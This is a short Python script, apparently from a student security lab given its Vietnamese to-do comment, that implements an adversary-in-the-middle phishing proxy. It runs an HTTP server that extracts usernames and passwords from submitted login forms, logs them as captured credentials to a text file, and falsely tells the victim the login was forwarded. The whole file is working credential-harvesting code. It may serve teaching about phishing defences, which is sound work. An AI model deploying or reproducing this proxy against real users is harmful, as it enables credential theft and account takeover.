# aitm_proxy.py
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

SERVER_IP = "172.25.0.3"
PORT = 8080

class AiTMProxy(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        # TODO: Sinh vien hoan thien doan code trich xuat thong tin
        params = urllib.parse.parse_qs(post_data)
        username = params.get('username', [''])[0]
        password = params.get('password', [''])[0]

        if username and password:
            print(f"[CREDENTIALS CAPTURED] User: {username} | Pass: {password}")
            with open("captured_creds.txt", "a") as f:
                f.write(f"{username}:{password}\n")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Login forwarded successfully.")

if __name__ == '__main__':
    print("AiTM Proxy running on port 8080...")
    httpd = HTTPServer(('0.0.0.0', PORT), AiTMProxy)
    httpd.serve_forever()
